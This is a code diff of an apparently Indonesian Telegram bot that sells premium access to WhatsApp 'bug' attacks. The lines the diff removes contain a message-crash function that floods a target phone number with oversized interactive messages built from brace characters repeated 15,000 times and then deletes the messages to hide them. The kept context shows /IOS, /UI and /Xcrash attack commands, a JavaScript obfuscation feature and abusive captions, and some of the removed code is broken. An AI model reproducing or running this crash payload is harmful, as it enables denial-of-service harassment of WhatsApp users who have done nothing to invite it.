@@ -81,8 +81,8 @@ const readline = require('readline');
 const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
 
-let premiumUsers = JSON.parse(fs.readFileSync('./設定/premium.json'));
-let adminUsers = JSON.parse(fs.readFileSync('./設定/admin.json'));
+let premiumUsers = JSON.parse(fs.readFileSync('./premium.json'));
+let adminUsers = JSON.parse(fs.readFileSync('./admin.json'));
 
 function ensureFileExists(filePath, defaultData = []) {
     if (!fs.existsSync(filePath)) {
@@ -90,16 +90,16 @@ function ensureFileExists(filePath, defaultData = []) {
     }
 }
 
-ensureFileExists('./設定/premium.json');
-ensureFileExists('./設定/admin.json');
+ensureFileExists('./premium.json');
+ensureFileExists('./admin.json');
 
 // Fungsi untuk menyimpan data premium dan admin
 function savePremiumUsers() {
-    fs.writeFileSync('./設定/premium.json', JSON.stringify(premiumUsers, null, 2));
+    fs.writeFileSync('./premium.json', JSON.stringify(premiumUsers, null, 2));
 }
 
 function saveAdminUsers() {
-    fs.writeFileSync('./設定/admin.json', JSON.stringify(adminUsers, null, 2));
+    fs.writeFileSync('./admin.json', JSON.stringify(adminUsers, null, 2));
 }
 
 // Fungsi untuk memantau perubahan file
@@ -117,52 +117,21 @@ function watchFile(filePath, updateCallback) {
     });
 }
 
-watchFile('./設定/premium.json', (data) => (premiumUsers = data));
-watchFile('./設定/admin.json', (data) => (adminUsers = data));
+watchFile('./premium.json', (data) => (premiumUsers = data));
+watchFile('./admin.json', (data) => (adminUsers = data));
 
 
 const axios = require("axios");
 const chalk = require("chalk"); // Import chalk untuk warna
-const config = require("./設定/config.js");
+const config = require("./config.js");
 const TelegramBot = require("node-telegram-bot-api");
 
 const BOT_TOKEN = config.BOT_TOKEN;
-const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/VexxuzzZ/ChaosssDB/refs/heads/main/data/database.json"; // Ganti dengan URL GitHub yang benar
-
-async function fetchValidTokens() {
-  try {
-    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
-    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
-  } catch (error) {
-    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
-    return [];
-  }
-}
-
-async function validateToken() {
-  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
-
-  const validTokens = await fetchValidTokens();
-  if (!validTokens.includes(BOT_TOKEN)) {
-    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
-    process.exit(1);
-  }
-
-  console.log(chalk.green(` #- Token Valid⠀⠀`));
-  startBot();
-}
-
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 function startBot() {
-`
-Z                 HAPPY BIRTHDAY BY VEXXUZZZ 
- y
-  u 
-   r
-    o
-     X
-      z
+  console.log(chalk.blue(`
+                                    
 Script: ZyuroXz
 Versi: 1.1
 Status: `) + chalk.bold.green('Terhubung') + chalk.bold.white(`
@@ -398,12 +367,10 @@ function getCurrentDate() {
 // Get Random Image
 function getRandomImage() {
   const images = [
-    "https://files.catbox.moe/6ph0wo.jpg",
-    "https://files.catbox.moe/9nlrgz.jpg",
-    "https://files.catbox.moe/ewo5om.jpg",
-    "https://files.catbox.moe/23ln1d.jpg",
-    "https://files.catbox.moe/9kepdh.jpg",
-    "https://files.catbox.moe/v60wr9.jpg"
+    "https://files.catbox.moe/51xw9q.jpg",
+    "https://files.catbox.moe/6tqcb0.jpg",
+    "https://files.catbox.moe/asxy34.jpg",
+    "https://files.catbox.moe/simsul.jpg",
   ];
   return images[Math.floor(Math.random() * images.length)];
 }
@@ -423,140 +390,6 @@ function checkCooldown(userId) {
   setTimeout(() => cooldowns.delete(userId), cooldownTime);
   return 0; // Tidak dalam cooldown
 }
-// Function Bug
-function sleep(ms) {
-  return new Promise(resolve => setTimeout(resolve, ms));
-}
-
-async function pungtion(sock, target, count = 3) {
-  const messageIds = [];
-
-  for (let i = 0; i < count; i++) {
-    try {
-      const message = {
-        viewOnceMessage: {
-          message: {
-            messageContextInfo: {
-              deviceListMetadata: {},
-              deviceListMetadataVersion: 2,
-            },
-            interactiveMessage: {
-              contextInfo: {
-                mentionedJid: [target],
-                isForwarded: true,
-                forwardingScore: 99999999,
-                businessMessageForwardInfo: {
-                  businessOwnerJid: target,
-                },
-              },
-              body: {
-                text: "📄Null Tanggapan Diterima" + "ꦽ".repeat(7777),
-              },
-              nativeFlowMessage: {
-                messageParamsJson: "{".repeat(9999),
-                buttons: [
-                  {
-                    name: "single_select",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "call_permission_request",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_url",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_call",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_copy",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_reminder",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "cta_cancel_reminder",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "address_message",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "send_location",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "quick_reply",
-                    buttonParamsJson: "{".repeat(15000),
-                    version: 3,
-                  },
-                  {
-                    name: "single_select",
-                    buttonParamsJson: "ꦽ".repeat(3000),
-                    version: 3,
-                  },
-                  {
-                    name: "call_permission_request",
-                    buttonParamsJson: JSON.stringify({ status: true }),
-                    version: 3,
-                  },
-                  {
-                    name: "camera_permission_request",
-                    buttonParamsJson: JSON.stringify({ cameraAccess: true }),
-                    version: 3,
-                  },
-                ],
-              },
-            },
-          },
-        },
-      };
-
-      // kirim message crash
-      const msg = await sock.sendMessage(target, message);
-      const messageId = msg.key.id;
-      messageIds.push(messageId);
-
-      console.log(`✅ [${i + 1}/${count}] Vexnew crash terkirim: ${messageId}`);
-
-      await sleep(600);
-    } catch (e) {
-      console.error("❌ Error NewEra:", e);
-    }
-  }
-
-  // 🔥 hapus semua pesan setelah dikirim
-  for (let i = 0; i < messageIds.length; i++) {
-    const id = messageIds[i];
-    await sleep(1000);
-    await sock.sendMessage(target, {
-      delete: {
-        remoteJid: target,
-        fromMe: false,
-        id,
-        participant: sock.user.id,
-      },
-    });
-    console.log(`🗑️ Pesan ${i + 1} dihapus`);
-  }
-
-  console.log("✅ Semua pesan crash sudah dihapus");
-}
 
 
 // ~ Enc Xopwn Confugurasi
@@ -564,11 +397,12 @@ const getVexxuzzZObfuscationConfig = () => {
     const generateSiuCalcrickName = () => {
         // Identifier generator pseudo-random tanpa crypto
         const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-        let randomPart = "";
+        let randomPart = "🀄";
         for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
             randomPart += chars[Math.floor(Math.random() * chars.length)];
         }
-        return `KONTOL和KONTOL无KONTOL气 /*KONTOL/*^/*($break)*/${randomPart}`;
+        return `
+Ᏽ𐌐𐌄𐌄𐌍®️🅰️💲🇪🅿 ^/*($break)*/${randomPart}`;
     };
 
     return {
@@ -658,9 +492,6 @@ function isOwner(userId) {
   return config.OWNER_ID.includes(userId.toString());
 }
 
-
-const bugRequests = {};
-
 /////---------------[sleep function]------_-_
 const bugRequests = {};
 
@@ -674,30 +505,31 @@ bot.onText(/\/start/, (msg) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: `<blockquote>少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています ( 🫟 ).</blockquote>`,
+    caption: `<blockquote>Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫟 ).</blockquote>`,
     parse_mode: "HTML",
     reply_markup: {
       inline_keyboard: [
-        [{ text: "Contact Owner", url: "https://t.me/ryzzxaja" }],
+        [{ text: "Contact Owner", url: "https://t.me/BangZyur" }],
       ]
     }
   });
 }
 
   bot.sendPhoto(chatId, randomImage, {
-    caption: `<blockquote><b>( 🀄 ) - みなさんこんにちは。戻ってきました。ZyuroxZXVO さんへ.</b>
+    caption: `
+<blockquote>-# Ɀ𐌙𐌵𐌐Ꝋ𐌗Ɀ 𐌒Ꮤ𐌄𐌐𐌕𐌙 -</blockquote>
 
-<b>-#  ZyuroxZ ☇ System </b>
+<blockquote>( 🀄 ) - みなさんこんにちは。戻ってきました。ZyuroXz Qwerty さんへ.
+<b>⬡ Author : VexxuzzZ?</b>
+<b>⬡ Version : 1.0.0</b>
+<b>⬡ Name Bot : ZyuroxZXVO¿?</b>
+<b>⬡ Framework : Telegraf</b>
+<b>⬡ Library : Javascript</b>
+<b>⬡ PRIVATE SCRIPT</b>
 </blockquote>
-⬡ Author : VexxuzzZ?
-⬡ Version : 1.0.0
-⬡ Name Bot : ZyuroxZXVO¿?
-⬡ Framework : Telegraf
-⬡ Library : Javascript
-⬡ PRIVATE SCRIPT
 
+<blockquote>Presss Button Menu ☇ © ZyuroXz</blockquote>
 
- Presss Button Menu ☇ © ZyuroXz
 `,
     parse_mode: 'HTML',
     reply_markup: {
@@ -705,7 +537,7 @@ if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) 
         [{ text: "ZyuroXz ☇ Xellent", callback_data: "bugmenu" }, 
         { text: "Thanks ☇ Too", callback_data: "thanksto" }],
         [{ text: "ZyuroXz ☇ Equesty", callback_data: "ownermenu" }],
-        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/ryzzxaja" }, 
+        [{ text: "ZyuroXz ☇ Developer", url: "https://t.me/BangZyur" }, 
         { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
       ]
     }
@@ -803,7 +635,7 @@ bot.on("callback_query", (callbackQuery) => {
         [{ text: "ZyuroXz ☇ Xellent", callback_data: "bugmenu" }, 
         { text: "Thanks ☇ Too", callback_data: "thanksto" }],
         [{ text: "ZyuroXz ☇ Equesty", callback_data: "ownermenu" }],
-        [{ text: "ZyuroXz ☇ Dev", url: "https://t.me/ryzzxaja" }, 
+        [{ text: "ZyuroXz ☇ Dev", url: "https://t.me/BangZyur" }, 
         { text: "Information Script", url: "https://t.me/ZyuroXzInfoe" }]
     ];
   }
@@ -840,7 +672,7 @@ bot.onText(/\/IOS (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
+    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -921,7 +753,7 @@ if (remainingTime > 0) {
 `, {
       chat_id: chatId,
       message_id: sentMessage.message_id,
-      parse_mode: "Markdown",
+      parse_mode: "Markdown", 
       reply_markup: {
         inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
       }
@@ -945,7 +777,7 @@ bot.onText(/\/UI (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
+    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -1050,7 +882,7 @@ bot.onText(/\/Xcrash (\d+)/, async (msg, match) => {
 
 if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
   return bot.sendPhoto(chatId, randomImage, {
-    caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
+    caption: "```\nBELI PREMIUM DULU SONO KONTOL\n\n#-Bangsat lu bukan premium user anjeng, beli dulu sana acces sama owner\n```",
     parse_mode: "MarkdownV2",
     reply_markup: {
       inline_keyboard: [
@@ -1145,28 +977,30 @@ if (remainingTime > 0) {
 
 // Enc Fiture
 
-bot.onText(/\/encvexxuzzz/, async (msg) => {
+bot.onText(/\/encjava/, async (msg) => {
     const chatId = msg.chat.id;
     const senderId = msg.from.id;
     const userId = msg.from.id.toString();
-
+     
+     if (shouldIgnoreMessage(msg)) return;
     // Cek Premium User
-    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
-        return bot.sendPhoto(chatId, randomImage, {
-            caption: "```\n少なくともプレミアムはまず、そのバグプレミアムは、その場所へのみアクセスでき、安いことが保証されています\n```",
-            parse_mode: "MarkdownV2",
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/VexxuzzZ" }],
-                    [{ text: "𝘖𝘸𝘯𝘦𝘳", url: "https://t.me/VexxuzzZ" }, { text: "𝘐𝘯𝘧𝘰", url: "https://t.me/VexxuzzZ" }]
-                ]
-            }
-        });
+if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
+  return bot.sendPhoto(chatId, randomImage, {
+    caption: `\`\`\`KAMU TIDAK MEMILIKI AKSES\`\`\`
+( ! ) Silahkan Registrasi Sebelum Menggunakan Bug
+`,
+    parse_mode: "Markdown",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "Developer", url: "https://t.me/BangZyur" }]
+      ]
     }
+  });
+}
 
-    // Cek apakah balas pesan dengan file
+   
     if (!msg.reply_to_message || !msg.reply_to_message.document) {
-        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encvexxuzzz`!", { parse_mode: "Markdown" });
+        return bot.sendMessage(chatId, "❌ *Error:* Balas file .js dengan `/encjava`!", { parse_mode: "Markdown" });
     }
 
     const file = msg.reply_to_message.document;
@@ -1174,7 +1008,7 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
         return bot.sendMessage(chatId, "❌ *Error:* Hanya file .js yang didukung!", { parse_mode: "Markdown" });
     }
 
-    const encryptedPath = path.join(__dirname, `vexxuzzz-encrypted-${file.file_name}`);
+    const encryptedPath = path.join(__dirname, `Aphocalyps-encrypted-${file.file_name}`);
 
     try {
         const progressMessage = await bot.sendMessage(chatId, "🔒 Memulai proses enkripsi...");
@@ -1198,8 +1032,8 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
 
         await updateProgress(bot, chatId, progressMessage, 40, "Inisialisasi Enkripsi");
 
-        // Proses enkripsi menggunakan Vincent Chaos Core
-        const obfuscated = await JsConfuser.obfuscate(fileContent, getVincentObfuscationConfig());
+        // Proses enkripsi menggunakan Aphocalyps Chaos Core
+        const obfuscated = await JsConfuser.obfuscate(fileContent, getVexxuzzZObfuscationConfig());
         let obfuscatedCode = obfuscated.code || obfuscated;
 
         if (typeof obfuscatedCode !== "string") {
@@ -1219,11 +1053,11 @@ bot.onText(/\/encvexxuzzz/, async (msg) => {
 
         // Kirim file hasil enkripsi
         await bot.sendDocument(chatId, encryptedPath, {
-            caption: "✅ *File terenkripsi (Vexxuzzz Chaos Core) siap!*\n_©INAZAMI INVICTUS",
+            caption: "✅ *File terenkripsi (Aphocalyps Chaos Core) siap!*\n_©𝚇𝚊𝚝𝚊 ENC_",
             parse_mode: "Markdown"
         });
 
-        await updateProgress(bot, chatId, progressMessage, 100, "VexxuzzZ Chaos Core Selesai");
+        await updateProgress(bot, chatId, progressMessage, 100, "Aphocalyps Chaos Core Selesai");
 
         // Hapus file setelah dikirim
         try {
@@ -1336,33 +1170,6 @@ bot.onText(/\/listprem/, (msg) => {
 
   bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
 });
-
-bot.onText(/\/listprem/, (msg) => {
-  const chatId = msg.chat.id;
-  const senderId = msg.from.id;
-  
-    if (!q) {
-        return m.reply(`Example:\n\n/cmd 628XXXX`);
-    }
-
-    let vexnumb = q.replace(/[^0-9]/g, '');
-
-    let bijipler = vexnumb + "@s.whatsapp.net";
-
-    let Proses = await m.reply(`Targeting : ${vexnumb}\nStatus : still in process\nThe process of launching a fatal attack`);
-
-    for (let i = 0; i < 2; i++) {
-        await pungtion(targetJid);
-    }
-
-    await sock.telegram.editMessageText(
-sock.chat.id,
-        Proses.message_id,
-        undefined,
-        `A fatal attack has landed on the target's WhatsApp\nThank you for using service\n\nAll right reversed by VexxuzzZ`
-    );
-});
-
 //=====================================
 bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
     const chatId = msg.chat.id;
